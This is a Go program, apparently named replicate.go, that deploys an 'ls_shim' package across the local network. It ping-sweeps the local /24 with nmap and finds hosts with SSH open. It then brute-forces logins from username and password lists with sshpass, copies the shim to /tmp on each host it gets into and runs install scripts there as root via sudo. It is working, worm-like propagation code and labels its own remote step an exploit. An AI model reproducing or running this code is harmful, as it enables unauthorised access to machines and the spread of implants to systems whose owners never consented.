package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
)

var systemOS string = getOS()
var isVerbose bool = false
var isDemo bool = false
var isThreaded bool = false
var usernames []string
var passwords []string
var installedIPs []string
var ignoreIPs []string
var wg sync.WaitGroup

func main() {
	args := os.Args
	if !handleArgs(args) {
		return
	}
	if isVerbose {
		fmt.Println("OS is: " + systemOS)
	}
	installDependencies()
	if isVerbose {
		fmt.Println("Dependencies installed")
	}
	ips := findIPs()
	fmt.Print("IP list: ")
	fmt.Println(ips)
	if !isDemo {
		transferFiles(ips)
	}
	if isVerbose && !isDemo {
		fmt.Println("Installed on the following IPs:")
		for i := 0; i < len(installedIPs); i++ {
			fmt.Println(installedIPs[i])
		}
	} else if !isVerbose {
		fmt.Println("Installations finished.")
	}

}

func runRemote(username, password, ip string) {
	if isVerbose {
		fmt.Println("Running exploit on remote system: " + username + "@" + ip)
	} else {
		fmt.Print("Installing on " + ip)
		if isThreaded {
			fmt.Println(" (DETACHED)")
		} else {
			fmt.Println()
		}
	}
	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
	buffer := bytes.Buffer{}
	buffer.Write([]byte("cd /tmp/ls_shim/\n" +
		"echo " + password + " | sudo -S chmod +x deploy/dependencies.sh\n" +
		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
		"echo " + password + " | sudo -S chmod +x install.sh\n" +
		"echo " + password + " | sudo -S ./install.sh\n" +
		"echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n",
	))
	cmd.Stdin = &buffer
	if isVerbose {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}

	err := cmd.Run()
	// err := login.Run()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	} else {
		installedIPs = append(installedIPs, ip)
		if isThreaded {
			fmt.Println("Finished installing on " + ip)
			wg.Done()
		}
	}
}

func sshUp(ip string) bool {
	cmd := exec.Command("nmap", ip, "-p", "22", "-oG", ".nmapscan-"+ip)
	cmd.Run()
	res := strings.Split(readFile(".nmapscan-"+ip), "\n")
	os.Remove(".nmapscan-" + ip)
	for i := 0; i < len(res); i++ {
		if strings.Index(res[i], "Ports: 22") != -1 {
			str := res[i][strings.Index(res[i], "/")+1:]
			str = str[:strings.Index(str, "/")]
			if str == "open" {
				return true
			}
		}
	}
	return false
}

func transferFiles(ips []string) {
	for i := 0; i < len(ips); i++ {
		if isVerbose {
			fmt.Println("Scanning port 22 on " + ips[i])
		}
		if sshUp(ips[i]) {
			if isVerbose {
				fmt.Println("Transferring files to " + ips[i])
			}
			for u := 0; u < len(usernames); u++ {
				if isVerbose {
					fmt.Println("Trying user " + usernames[u])
				}
				complete := false
				for p := 0; p < len(passwords); p++ {
					if isVerbose {
						command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
						fmt.Println(command)
					}
					cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
					err := cmd.Run()
					if err == nil {
						if isVerbose {
							fmt.Println("Files sent")
						}
						if isThreaded {
							wg.Add(1)
							go runRemote(usernames[u], passwords[p], ips[i])
						} else {
							runRemote(usernames[u], passwords[p], ips[i])
						}
						complete = true
						break
					}
				}
				if complete {
					break
				} else {
					if isVerbose {
						fmt.Println("User " + usernames[u] + " failed. Trying next user...")
					}
				}
			}
		} else if isVerbose {
			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
		}
	}
	if isThreaded {
		wg.Wait()
	}

}

func findIPs() []string {
	var ipList []string
	localIp := GetOutboundIP()
	if isVerbose {
		fmt.Println("Local IP is " + localIp)
	}
	ipRange := getPrefix(localIp) + ".0/24"
	fmt.Println(ipRange)
	cmd := exec.Command("nmap", "-sn", ipRange, "-oG", ".ipscan_lsshim")
	cmd.Run()
	ipStr := readFile(".ipscan_lsshim")
	os.Remove(".ipscan_lsshim")
	ipArr := strings.Split(ipStr, "\n")
	for i := 0; i < len(ipArr); i++ {
		if strings.Index(ipArr[i], "Host: ") != -1 {
			ip := ipArr[i][strings.Index(ipArr[i], "Host: ")+6 : strings.Index(ipArr[i], " (")]
			if ip != localIp && !contains(ignoreIPs, ip) {
				ipList = append(ipList, ip)
			} else if isVerbose {
				fmt.Println("Ignoring " + ip)
			}
		}
	}
	return ipList
}

func getSuffix(ip string) string {
	newStr := strings.Replace(ip, ".", "!", 2)
	index := strings.Index(newStr, ".")
	suffix := newStr[index+1:]
	suffix = suffix + "/24"
	return suffix
}
func getPrefix(ip string) string {
	newStr := strings.Replace(ip, ".", "!", 2)
	index := strings.Index(newStr, ".")
	prefix := strings.Replace(newStr[:index], "!", ".", 2)
	return prefix
}

func getOS(isFail ...bool) string {
	var ret_os string
	checkID := false
	if len(isFail) > 0 && isFail[0] {
		checkID = true
	}
	os_str := readFile("/etc/os-release")
	os_split := strings.Split(os_str, "\n")
	for i := 0; i < len(os_split); i++ {
		matchString := "ID_LIKE="
		if checkID {
			matchString = "ID="
		}
		if strings.Index(os_split[i], matchString) == 0 {
			ret_os = strings.Replace(os_split[i], matchString, "", 1)
			ret_os = strings.Replace(ret_os, `"`, "", -1)
			break
		}
	}
	if ret_os == "" && !checkID {
		return getOS(true)
	}
	return ret_os
}

func handleArgs(args []string) bool {
	var pIsList, uIsList, uIsSingle, pIsSingle bool
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "--demo" {
				isDemo = true
			} else if args[i] == "-u" {
				if uIsList {
					fmt.Println("Error: cannot supply both -u and --user-list")
					return false
				}
				uIsSingle = true
				usernames = append(usernames, args[i+1])
			} else if args[i] == "-p" {
				if pIsList {
					fmt.Println("Error: cannot supply both -p and --password-list")
					return false
				}
				pIsSingle = true
				passwords = append(passwords, args[i+1])
			} else if args[i] == "--user-list" {
				if uIsSingle {
					fmt.Println("Error: cannot supply both -u and --user-list")
					return false
				}
				uIsList = true
				usernames = strings.Split(args[i+1], ",")
			} else if args[i] == "--password-list" {
				if pIsSingle {
					fmt.Println("Error: cannot supply both -p and --password-list")
					return false
				}
				pIsList = true
				passwords = strings.Split(args[i+1], ",")
			} else if args[i] == "--ignore" || args[i] == "-i" {
				ignoreIPs = strings.Split(args[i+1], ",")
			} else if args[i] == "-v" || args[i] == "--verbose" {
				if !isThreaded {
					isVerbose = true
				} else {
					fmt.Println("Error: verbose is not compatible with multithreading")
					//return false
					isVerbose = true
				}
			} else if args[i] == "-m" || args[i] == "--multi" {
				if !isVerbose {
					isThreaded = true
				} else {
					fmt.Println("Error: verbose is not compatible with multithreading")
					//return false
				}
			} else if args[i] == "--help" || args[i] == "-h" {
				fmt.Println("ls_shim deploy\n\n" +
					"usage: go run replicate.go -u [username] -p [password] [args]\n" +
					"-v or --verbose			|	Enable verbose output\n" +
					"-i [IPs] or --ignore [IPS]	|	Specify a list of IPs to ignore, separated by commas\n" +
					"-m or --multi			|	Run in multithreaded mode. Not compatible with verbose.\n" +
					"--help or -h			|	Display this help menu\n" +
					"--password-list [PASSWORDS]	|	Specify a list of passwords, separated by commas\n" +
					"--user-list [USERS]		|	Specify a list of users, separated by commas",
				)
				return false
			}
		}
	}
	if isDemo || ((pIsList || pIsSingle) && (uIsList || uIsSingle)) {
		return true
	}
	if !(uIsList || uIsSingle) {
		fmt.Println("Error: must supply at least one username")
		return false
	}
	if !(pIsList || pIsSingle) {
		fmt.Println("Error: must supply at least one password")
		return false
	}
	fmt.Println("Error: not enough arguments supplied. Exiting...")
	return false
}

func installDependencies() {
	if systemOS == "debian" {
		cmd := exec.Command("apt-get", "install", "sshpass", "-y")
		cmd.Run()
		cmd = exec.Command("apt-get", "install", "nmap", "-y")
		cmd.Run()
	} else if systemOS == "arch" {
		cmd := exec.Command("pacman", "-S", "sshpass", "--noconfirm")
		cmd.Run()
		cmd = exec.Command("pacman", "-S", "nmap", "--noconfirm")
		cmd.Run()
	} else if strings.Index(systemOS, "rhel") != -1 {
		cmd := exec.Command("curl", "http://mirror.centos.org/centos/7/extras/x86_64/Packages/sshpass-1.06-2.el7.x86_64.rpm", "-o", "sshpass.rpm")
		cmd.Run()
		cmd = exec.Command("yum", "localinstall", "sshpass.rpm", "-y")
		cmd.Run()
		cmd = exec.Command("rm -f", "sshpass.rpm")
		cmd.Run()
		cmd = exec.Command("yum", "install", "nmap", "-y")
		cmd.Run()
	} else if systemOS == "fedora" {
		cmd := exec.Command("dnf", "install", "sshpass", "-y")
		cmd.Run()
		cmd = exec.Command("dnf", "install", "nmap", "-y")
		cmd.Run()
	}
}

func runCommand(binary, args string) {
	cmd := exec.Command(binary, args)
	err := cmd.Run()
	fmt.Println(err)
}

func readFile(path string) string {
	dat, _ := ioutil.ReadFile(path)
	str := string(dat)
	return str
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}
